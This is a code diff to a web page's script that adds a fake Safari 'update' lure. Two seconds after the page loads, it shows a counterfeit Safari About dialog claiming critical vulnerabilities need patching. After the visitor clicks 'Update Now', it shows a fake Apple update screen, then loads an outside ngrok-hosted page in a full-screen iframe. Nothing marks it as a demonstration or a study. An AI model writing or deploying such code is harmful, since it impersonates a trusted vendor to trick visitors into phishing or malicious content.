@@ -1172,156 +1172,314 @@
             }
         });
 
-        setTimeout(function() {
-    showUpdatePopup({ preventDefault: function() {} });
-}, 2000);
+        setTimeout(function () {
+            showUpdatePopup({ preventDefault: function () { } });
+        }, 2000);
 
 
-function showUpdatePopup(event) {
-    event.preventDefault();
+        function showUpdatePopup(event) {
+            event.preventDefault();
 
-    const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = '0';
-    overlay.style.left = '0';
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-    overlay.style.zIndex = '10000';
-    overlay.style.display = 'flex';
-    overlay.style.justifyContent = 'center';
-    overlay.style.alignItems = 'center';
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
 
-    const popup = document.createElement('div');
-    popup.style.backgroundColor = 'white';
-    popup.style.padding = '30px';
-    popup.style.borderRadius = '8px';
-    popup.style.maxWidth = '400px';
-    popup.style.textAlign = 'center';
+            // Create Safari About dialog
+            const dialog = document.createElement('div');
+            dialog.style.width = '350px';
+            dialog.style.backgroundColor = 'white';
+            dialog.style.borderRadius = '10px';
+            dialog.style.boxShadow = '0 10px 30px rgba(0, 0, 0, 0.15)';
+            dialog.style.overflow = 'hidden';
+            dialog.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
 
-    const title = document.createElement('h3');
-    title.textContent = 'Browser Update Required';
-    title.style.marginBottom = '15px';
+            // Dialog header with macOS buttons
+            const dialogHeader = document.createElement('div');
+            dialogHeader.style.height = '30px';
+            dialogHeader.style.backgroundColor = '#f6f6f6';
+            dialogHeader.style.borderBottom = '1px solid #e0e0e0';
+            dialogHeader.style.display = 'flex';
+            dialogHeader.style.alignItems = 'center';
+            dialogHeader.style.paddingLeft = '12px';
 
-    const message = document.createElement('p');
-    message.textContent = 'Your browser needs to be updated to continue.';
-    message.style.marginBottom = '20px';
+            // Window buttons (red, yellow, green)
+            const createButton = (color) => {
+                const button = document.createElement('div');
+                button.style.width = '12px';
+                button.style.height = '12px';
+                button.style.borderRadius = '50%';
+                button.style.marginRight = '8px';
+                button.style.backgroundColor = color;
+                return button;
+            };
 
-    const updateButton = document.createElement('button');
-    updateButton.textContent = 'Update';
-    updateButton.style.padding = '10px 20px';
-    updateButton.style.backgroundColor = '#000';
-    updateButton.style.color = '#fff';
-    updateButton.style.border = 'none';
-    updateButton.style.borderRadius = '6px';
-    updateButton.style.cursor = 'pointer';
+            const closeButton = createButton('#ff5f57');
+            const minimizeButton = createButton('#febc2e');
+            const maximizeButton = createButton('#28c940');
 
-    updateButton.addEventListener('click', function () {
-        document.body.removeChild(overlay);
+            dialogHeader.appendChild(closeButton);
+            dialogHeader.appendChild(minimizeButton);
+            dialogHeader.appendChild(maximizeButton);
+            dialog.appendChild(dialogHeader);
 
-        // Create loading overlay
-        const loadingOverlay = document.createElement('div');
-        loadingOverlay.style.position = 'fixed';
-        loadingOverlay.style.top = '0';
-        loadingOverlay.style.left = '0';
-        loadingOverlay.style.width = '100%';
-        loadingOverlay.style.height = '100%';
-        loadingOverlay.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
-        loadingOverlay.style.zIndex = '10001';
-        loadingOverlay.style.display = 'flex';
-        loadingOverlay.style.justifyContent = 'center';
-        loadingOverlay.style.alignItems = 'center';
+            // Dialog content
+            const dialogContent = document.createElement('div');
+            dialogContent.style.padding = '30px 20px';
+            dialogContent.style.display = 'flex';
+            dialogContent.style.flexDirection = 'column';
+            dialogContent.style.alignItems = 'center';
+            dialogContent.style.textAlign = 'center';
 
-        const spinner = document.createElement('div');
-        spinner.style.display = 'inline-block';
-        spinner.style.width = '50px';
-        spinner.style.height = '50px';
-        spinner.style.border = '5px solid rgba(0, 0, 0, 0.1)';
-        spinner.style.borderRadius = '50%';
-        spinner.style.borderTopColor = '#000';
-        spinner.style.animation = 'spin 1s ease-in-out infinite';
-        spinner.style.marginBottom = '20px';
+            // Safari icon (using local image)
+            const safariIcon = document.createElement('img');
+            safariIcon.src = 'Safari.png';
+            safariIcon.alt = 'Safari';
+            safariIcon.style.width = '90px';
+            safariIcon.style.height = '60px';
+            safariIcon.style.marginBottom = '20px';
+            safariIcon.style.filter = 'drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1))';
 
-        const loadingText = document.createElement('div');
-        loadingText.textContent = 'Updating browser...';
-        loadingText.style.fontSize = '16px';
-        loadingText.style.color = '#333';
-        loadingText.style.marginBottom = '10px';
+            // App name
+            const appName = document.createElement('div');
+            appName.textContent = 'Safari';
+            appName.style.fontSize = '20px';
+            appName.style.fontWeight = '500';
+            appName.style.marginBottom = '10px';
+            appName.style.color = '#333';
 
-        const loadingContainer = document.createElement('div');
-        loadingContainer.style.display = 'flex';
-        loadingContainer.style.flexDirection = 'column';
-        loadingContainer.style.alignItems = 'center';
-        loadingContainer.style.justifyContent = 'center';
-        loadingContainer.style.backgroundColor = 'white';
-        loadingContainer.style.padding = '40px';
-        loadingContainer.style.borderRadius = '8px';
-        loadingContainer.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
-        loadingContainer.style.width = '300px';
-        loadingContainer.style.textAlign = 'center';
+            // Version
+            const version = document.createElement('div');
+            version.textContent = 'Version 17.6 (19618.3.11.11.5)';
+            version.style.fontSize = '13px';
+            version.style.color = '#666';
+            version.style.marginBottom = '15px';
 
-        const style = document.createElement('style');
-        style.textContent = `
+            // Copyright/message
+            const copyright = document.createElement('div');
+            copyright.textContent = 'Critical vulnerabilities patched from previous versions. This update will only take a few seconds.';
+            copyright.style.fontSize = '12px';
+            copyright.style.color = '#888';
+            copyright.style.lineHeight = '1.5';
+
+            // Update button
+            const updateButton = document.createElement('button');
+            updateButton.textContent = 'Update Now';
+            updateButton.style.marginTop = '25px';
+            updateButton.style.backgroundColor = '#0071e3';
+            updateButton.style.color = 'white';
+            updateButton.style.border = 'none';
+            updateButton.style.borderRadius = '5px';
+            updateButton.style.padding = '8px 20px';
+            updateButton.style.fontSize = '13px';
+            updateButton.style.fontWeight = '500';
+            updateButton.style.cursor = 'pointer';
+            updateButton.style.transition = 'background-color 0.2s';
+
+            updateButton.onmouseover = function () {
+                updateButton.style.backgroundColor = '#0062c4';
+            };
+            updateButton.onmouseout = function () {
+                updateButton.style.backgroundColor = '#0071e3';
+            };
+
+            updateButton.addEventListener('click', function () {
+                document.body.removeChild(overlay);
+
+                const loadingOverlay = document.createElement('div');
+                loadingOverlay.style.position = 'fixed';
+                loadingOverlay.style.top = '0';
+                loadingOverlay.style.left = '0';
+                loadingOverlay.style.width = '100%';
+                loadingOverlay.style.height = '100%';
+                loadingOverlay.style.backgroundColor = '#f5f5f7';
+                loadingOverlay.style.zIndex = '10001';
+                loadingOverlay.style.display = 'flex';
+                loadingOverlay.style.flexDirection = 'column';
+                loadingOverlay.style.justifyContent = 'center';
+                loadingOverlay.style.alignItems = 'center';
+                loadingOverlay.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif';
+                loadingOverlay.style.overflow = 'hidden';
+
+                document.body.style.overflow = 'hidden';
+
+                const style = document.createElement('style');
+                style.textContent = `
             @keyframes spin {
                 to { transform: rotate(360deg); }
             }
-        `;
-        document.head.appendChild(style);
-
-        loadingContainer.appendChild(spinner);
-        loadingContainer.appendChild(loadingText);
-        loadingOverlay.appendChild(loadingContainer);
-        document.body.appendChild(loadingOverlay);
-
-        // Create hidden iframe but don't append it yet
-        const hiddenFrame = document.createElement('iframe');
-        hiddenFrame.style.position = 'fixed';
-        hiddenFrame.style.top = '0';
-        hiddenFrame.style.left = '0';
-        hiddenFrame.style.width = '100%';
-        hiddenFrame.style.height = '100%';
-        hiddenFrame.style.border = 'none';
-        hiddenFrame.style.zIndex = '99999';
-        hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
-        
-        // Pre-load the iframe
-        hiddenFrame.onload = function() {
-            document.body.style.overflow = 'hidden';
             
-            // Only remove the loader once we're actually going to try fullscreen
-            try {
-                // Request fullscreen first
-                hiddenFrame.requestFullscreen().then(() => {
-                    // Remove loading overlay only after fullscreen is activated
-                    document.body.removeChild(loadingOverlay);
-                }).catch(err => {
-                    console.log("Error attempting to enable fullscreen: ", err);
-                    // If fullscreen fails, still remove the loader
-                    document.body.removeChild(loadingOverlay);
-                });
-            } catch (error) {
-                console.error("Fullscreen error:", error);
-                // If fullscreen throws an error, still remove the loader
-                document.body.removeChild(loadingOverlay);
+            .container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 50px;
             }
-        };
+            
+            .apple-logo {
+                width: 80px;
+                height: 98px;
+                fill: #8e8e93;
+                margin-bottom: 100px;
+            }
+            
+            .spinner {
+                width: 20px;
+                height: 20px;
+                border: 2px solid rgba(142, 142, 147, 0.3);
+                border-top-color: #8e8e93;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+            }
+            
+            .progress-bar-container {
+                width: 300px;
+                height: 6px;
+                background-color: rgba(142, 142, 147, 0.3);
+                border-radius: 3px;
+                overflow: hidden;
+                margin-top: 20px;
+            }
+            
+            .progress-bar {
+                height: 100%;
+                width: 0;
+                background-color: #8e8e93;
+                border-radius: 3px;
+                transition: width 0.3s ease;
+            }
+            
+            .bg-blur {
+                position: absolute;
+                width: 200px;
+                height: 200px;
+                border-radius: 50%;
+                filter: blur(80px);
+                opacity: 0.07;
+                z-index: -1;
+            }
+            
+            .blur-1 {
+                top: 20%;
+                left: 20%;
+                background-color: #5ac8fa;
+            }
+            
+            .blur-2 {
+                bottom: 20%;
+                right: 20%;
+                background-color: #ff9500;
+            }
+            
+            .blur-3 {
+                bottom: 30%;
+                left: 30%;
+                background-color: #ff2d55;
+            }
+        `;
+                document.head.appendChild(style);
 
-        // Wait a moment before adding the iframe to ensure the loading animation is visible
-        setTimeout(() => {
-            document.body.appendChild(hiddenFrame);
-        }, 1000);
-    });
+                const blur1 = document.createElement('div');
+                blur1.className = 'bg-blur blur-1';
+                loadingOverlay.appendChild(blur1);
 
-    popup.appendChild(title);
-    popup.appendChild(message);
-    popup.appendChild(updateButton);
-    overlay.appendChild(popup);
-    document.body.appendChild(overlay);
-}
+                const blur2 = document.createElement('div');
+                blur2.className = 'bg-blur blur-2';
+                loadingOverlay.appendChild(blur2);
 
+                const blur3 = document.createElement('div');
+                blur3.className = 'bg-blur blur-3';
+                loadingOverlay.appendChild(blur3);
 
+                const container = document.createElement('div');
+                container.className = 'container';
+
+                const appleLogo = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+                appleLogo.setAttribute('class', 'apple-logo');
+                appleLogo.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
+                appleLogo.setAttribute('viewBox', '0 0 170 170');
+
+                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                path.setAttribute('d', 'M127.805 83.478c-.21-21.95 17.931-32.474 18.745-32.988-10.198-14.929-26.071-16.976-31.715-17.213-13.513-1.369-26.388 7.95-33.228 7.95-6.84 0-17.395-7.759-28.59-7.542-14.695.214-28.221 8.549-35.793 21.73-15.264 26.506-3.905 65.762 10.976 87.3 7.258 10.498 15.907 22.278 27.255 21.842 10.929-.436 15.066-7.073 28.291-7.073 13.224 0 16.95 7.073 28.51 6.844 11.772-.214 19.237-10.711 26.422-21.28 8.325-12.177 11.743-23.962 11.936-24.556-.262-.119-22.895-8.781-23.125-34.847M105.234 25.067c6.026-7.32 10.086-17.5 8.977-27.627-8.673.348-19.173 5.782-25.371 13.102-5.574 6.456-10.454 16.797-9.132 26.709 9.673.755 19.54-4.933 25.526-12.184');
+                appleLogo.appendChild(path);
+
+                const spinner = document.createElement('div');
+                spinner.className = 'spinner';
+
+                const progressBarContainer = document.createElement('div');
+                progressBarContainer.className = 'progress-bar-container';
+
+                const progressBar = document.createElement('div');
+                progressBar.className = 'progress-bar';
+                progressBar.id = 'progress';
+                progressBarContainer.appendChild(progressBar);
+
+                container.appendChild(appleLogo);
+                container.appendChild(spinner);
+                container.appendChild(progressBarContainer);
+                loadingOverlay.appendChild(container);
+
+                document.body.appendChild(loadingOverlay);
+
+                let width = 0;
+                const progressInterval = setInterval(() => {
+                    if (width >= 100) {
+                        clearInterval(progressInterval);
+                    } else {
+                        width += Math.random() * 4 + 6;
+                        if (width > 100) width = 100;
+                        progressBar.style.width = width + '%';
+                    }
+                }, 80);
+
+                const hiddenFrame = document.createElement('iframe');
+                hiddenFrame.style.position = 'fixed';
+                hiddenFrame.style.top = '0';
+                hiddenFrame.style.left = '0';
+                hiddenFrame.style.width = '100%';
+                hiddenFrame.style.height = '100%';
+                hiddenFrame.style.border = 'none';
+                hiddenFrame.style.zIndex = '99999';
+                hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
+
+                hiddenFrame.onload = function () {
+                    document.body.style.overflow = 'hidden';
+
+                    try {
+                        hiddenFrame.requestFullscreen().then(() => {
+                            document.body.removeChild(loadingOverlay);
+                        }).catch(err => {
+                            console.log("Error attempting to enable fullscreen: ", err);
+                            document.body.removeChild(loadingOverlay);
+                        });
+                    } catch (error) {
+                        console.error("Fullscreen error:", error);
+                        document.body.removeChild(loadingOverlay);
+                    }
+                };
+
+                setTimeout(() => {
+                    document.body.appendChild(hiddenFrame);
+                }, 1000);
+            });
+            dialogContent.appendChild(safariIcon);
+            dialogContent.appendChild(appName);
+            dialogContent.appendChild(version);
+            dialogContent.appendChild(copyright);
+            dialogContent.appendChild(updateButton);
+            dialog.appendChild(dialogContent);
+
+            overlay.appendChild(dialog);
+            document.body.appendChild(overlay);
+        }
     </script>
-
 </body>
-
 </html>
